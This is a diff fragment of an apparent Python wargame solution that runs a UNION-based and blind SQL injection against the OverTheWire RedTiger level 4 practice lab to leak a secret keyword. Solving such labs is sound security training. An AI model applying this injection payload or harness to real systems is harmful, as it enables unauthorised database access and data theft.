@@ -129,15 +129,12 @@ class blindSQLi(object):
                 pass
         return leaked
 
-
-
-        
 resp = requests.post("http://redtiger.labs.overthewire.org/level4.php?id=2+union+select+keyword,1+from+level4_secret;--", proxies=proxyDict, cookies=cookies)
 # print(resp.status_code)
 # print(resp.text)
 
 
-data = {"secretword" : "no", "go" : "Go!"}
+data = {"secretword" : "so", "go" : "Go!"}
 level4 = blindSQLi("POST", "redtiger.labs.overthewire.org", "/level4.php", "level4_secret", "keyword", ";--",
                     2, data=data, quote="", querystring="id=VULNERABLE", first_val="2", protocol="http", 
                     cookies=cookies, proxies=proxyDict)
